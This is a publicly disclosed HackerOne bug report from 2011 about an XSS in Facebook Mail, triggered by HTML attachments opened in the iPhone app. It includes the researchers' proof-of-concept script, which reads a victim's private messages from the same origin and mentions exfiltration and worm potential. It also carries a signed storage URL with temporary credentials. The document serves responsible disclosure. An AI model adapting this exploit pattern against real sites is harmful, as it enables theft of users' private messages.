{"id":390344,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zOTAzNDQ=","url":"https://hackerone.com/reports/390344","title":"iPhone app XSS in Facebook Mail","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2011-07-27T19:59:52.000Z","submitted_at":"2011-07-27T19:59:52.000Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"michiel","url":"/michiel","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/007/439427fb81f710e5e16246ede1828613d46bb79e_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":41286,"url":"https://hackerone.com/facebook","handle":"facebook","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/041/286/e548f3b311a171523d7048bc794f3e942166a0ea_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/041/286/e548f3b311a171523d7048bc794f3e942166a0ea_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Facebook","twitter_handle":"facebook","website":"https://facebook.com","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":true,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2018-08-03T20:08:45.145Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":null,"comments_closed?":true,"facebook_team?":true,"team_private?":false,"vulnerability_information":"**From Alex Rice:**\n\u003e Hi Jobert, Michiel -\n\u003e \n\u003e I run the Product Security team over at Facebook. ██████ just sent along a note mentioning that you're attempting to contact us with information on a XSS in Facebook's mail site. Can you share any additional details?\n\u003e \n\u003e Thanks!\n\n**Our response:**\nDuring a recent security review we did for ██████, we discovered a Cross-Site Scripting (XSS) issue related to how in-app iOS browsers handle the rendering of attachments. We did a quick check to see if a related vulnerability would be present at Facebook. \n\nWe discovered the Facebook Mail feature is particularly vulnerable to this. The XSS can be used to get access to other messages in a user’s inbox and can be wormified for greater impact.\n\nTo reproduce this vulnerability, you need to send the attached file - {F328174} - to someone’s Facebook email address. This file contains the proof of concept exploit code. When the user opens the attachment via the Facebook iPhone app (might work on other mobile devices as well), the attached HTML file containing the exploit gets executed in the same origin as https://iphone.facebook.com. In this particular proof of concept, the victim will see their private messages displayed. It would be trivial to expand the PoC to send this data to an external server, or access other private information such as the victim’s photos.\n\nTo clarify further, when opening the attachment on an iPhone via the Facebook app, the current session is used to authenticate and render the attachment in the mobile in-app browser. Because of the shared session, the browser can send AJAX calls to https://iphone.facebook.com and retrieve content. This also bypasses the frame busting mechanism and JSON obfuscation system, as it is unnecessary to do a cross-domain attack and the retrieved `for (;;);` can be removed on-the-fly given that the XSS operates in the same origin.\n\nBecause we're in the Bay Area now and scheduled to fly back to the Netherlands on Monday, we asked ██████ if they could potentially expedite things a bit and see if we could do a meeting at FB and discuss our findings.\n\n**fb-mail-poc.html:**\n```js\n\u003cscript type=\"text/javascript\" src=\"http://www.online24.nl/static/assets/js/jquery-1.4.4.min.js\"\u003e\u003c/script\u003e\n\u003cscript type=\"text/javascript\"\u003e\n\t// http://iphone.facebook.com/photo_dashboard.php?endtime=1311780199\u0026__ajax__\u0026__metablock__=9\n\t$(function(){\n\t\tparse_messages = function()\n\t\t{\n\t\t\t$('.twoLines.preview\u003e.snippet').each(function(index,value)\n\t\t\t{\n\t\t\t\tlines = value.innerHTML.replace(/(\u003c([^\u003e]+)\u003e)/ig,'');\n\t\t\t\t\n\t\t\t\talert(lines);\n\t\t\t});\n\t\t};\n\t\t\n\t\t$.ajax({\n\t\t \turl:\"https://iphone.facebook.com/messages/?refid=7\u0026__ajax__\u0026__m_async_page__\u0026__jewels__\u0026__metablock__=3\",\n\t\t\tsuccess:function(data)\n\t\t\t{\n\t\t\t\tx = eval('('+data.substr(9)+')');\n\t\t\t\tdocument.write('\u003cdiv style=\"display:none;\"\u003e'+x.m[1].html+'\u003c/div\u003e');\n\t\t\t\t\n\t\t\t\tparse_messages();\n\t\t\t}\n\t\t});\n\t});\n\u003c/script\u003e\n```","original_report_id":null,"original_report_url":null,"attachments":[{"id":328174,"file_name":"fb-mail-poc.html","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/328/174/ffeda19be5becf5c56c7773a75aa313343cff899/fb-mail-poc.html?response-content-disposition=attachment%3B%20filename%3D%22fb-mail-poc.html%22%3B%20filename%2A%3DUTF-8%27%27fb-mail-poc.html\u0026response-content-type=application%2Foctet-stream\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ57JDOB6N%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T145436Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJGMEQCIEj%2FvPHmMbBPYj%2BEqI%2BytJ5vP%2BW1Gij3b1KCROLW2m2fAiAUI2BnkECXV9d7hwkeZDEOYP6soFW%2FVQ7MIgaTaOghmSqDBAjw%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMaJpXtlkzQ%2F0YHokTKtcDqr54hfj92oRcu2Uf5AYn5X1dcYZ2fUSGzbf8TlAKPi%2BieszVvrvHI%2FlmbHmgiT1EynvsarNndOfkF2FRqu00jKx0CkmuRzepTozsI%2FVM4zmVsulVco0%2FTcUTH7ncLq5w17UCDOGpnW6JGeAot2EMSfGI%2BXeXow9Po2gINOm1gQnayfBCxU0Glim8HMTLVSft15PsLBhoVz6MQjjs5LpN9XS8yUG%2FvTzXTgclJY%2F9kWPo7VUzvyGgDBwaQ1NS4mY%2FwZ0AT%2BbZ6JXbFSX9ET%2BsjMi2Xi4Iz%2BSZK9IqUkrM05KykgVZmm0Jj83i2n43f%2BohD1oputpWW5Uu1cAXNs%2F4CRB2hvvyPQb%2B2khSXC6sOQi3exb9EuT5FkfOJXRD2w2ObGvWHxM%2BDQNczFHMaUBsCSSNn2cKqA093ghnjQ0g83xgTV9SBPb0QjpItD1Tnt9%2Bri%2FBh8RNCTedm%2Bor7TU6AnBCa6N50D96ANJhWhGw8kKZQdvzW0b0yw%2FH0clJ9XBtHGp1ul88rpA7tUuIoM7z31gr%2FReHR4G0fbpI0Bw%2BzUst%2BenEZyU7QQChxDc0u9loqAHNkWSJ3vDfDAhU2gFvocid02DAX%2FlKRXns4oUAYN7obhQgZX31MK2XkYsGOqYBmhNgLXdsx%2F8OPaK%2FmcpHbqK%2FVdgD3s09C%2FMBcjoeNruPiR%2B0%2FIpdgtcxNhaPoR0zb6re%2ByXh4v3hr2D2Z0%2BZCE4KiobLnf4PqE9a5czy2i5ctMeGIPCspubSRwCRBRORrnkT6%2FEocUc5PNqombEgctkvB80CoCyMfXpFqtIL0ne7x%2B%2B6lVkpXfm14Eb3XaRg7qWG7XL4Ud5U62KMTzbzA3t%2FxnvzsA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=6053ed2f5407d9350b3e0cd21fe659655955bf45830daee1923713c7221ed550","file_size":760,"type":"text/html"}],"allow_singular_disclosure_at":null,"vote_count":176,"voters":["obsesif","iv1","dyuen","jokebookservice1","barbie_girl","dirk","stefanofinding","ziot","ertugrul","jobert","and 166 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":3138696,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2011-07-28T19:59:52.000Z","updated_at":"2011-07-28T19:59:52.000Z","actor":{"username":"michiel","cleared":true,"url":"/michiel","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/007/439427fb81f710e5e16246ede1828613d46bb79e_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"michiel","url":"/michiel"},"genius_execution_id":null,"team_handle":"facebook","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3138697,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2018-08-03T20:08:45.166Z","updated_at":"2018-08-03T20:08:45.166Z","actor":{"username":"michiel","cleared":true,"url":"/michiel","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/007/439427fb81f710e5e16246ede1828613d46bb79e_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"facebook","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":9700,"category":"researcher","content":"Why am I reading a 2011 vulnerability report to Facebook? Good question!\n\nThis is the very first vulnerability @jobert and I ever submitted to Facebook. This was also before the Facebook bug bounty program was even established. It was a simple XSS in Facebook Mail that was quickly triaged and resolved back in July 2011. But perhaps more importantly, this is how we met @arice and ultimately led to the founding of HackerOne in 2012! I guess you could say the rest is history….\n\nFun facts:\n* After the introduction of the Facebook bug bounty program, the committee decided to retroactively award us with $3,000 for this XSS.\n* This pre-dates widespread adoption of Content-Security Policies.\n* This also pre-dates origin sandboxing on iOS when content is served with the `Content-Disposition: attachment` header. In older versions of iOS this content would execute in the same origin.","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":7,"username":"michiel","name":"Michiel Prins","bio":"Co-founder of HackerOne","cleared":true,"website":"https://hackerone.com","location":"San Francisco, CA","created_at":"2013-03-08T01:22:56.332Z","url":"https://hackerone.com/michiel","anc_triager":false,"hackerone_triager":false,"hackerone_employee":true,"hacker_resume_enabled":true,"user_type":"hacker","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/007/439427fb81f710e5e16246ede1828613d46bb79e_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/007/439427fb81f710e5e16246ede1828613d46bb79e_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://profile-photos.hackerone-user-content.com/variants/000/000/007/439427fb81f710e5e16246ede1828613d46bb79e_original.png/c11036e2d3f8b05af4b5da5984ccdec6f786b763c8abceb4e68042e10dcdae85"}}}]}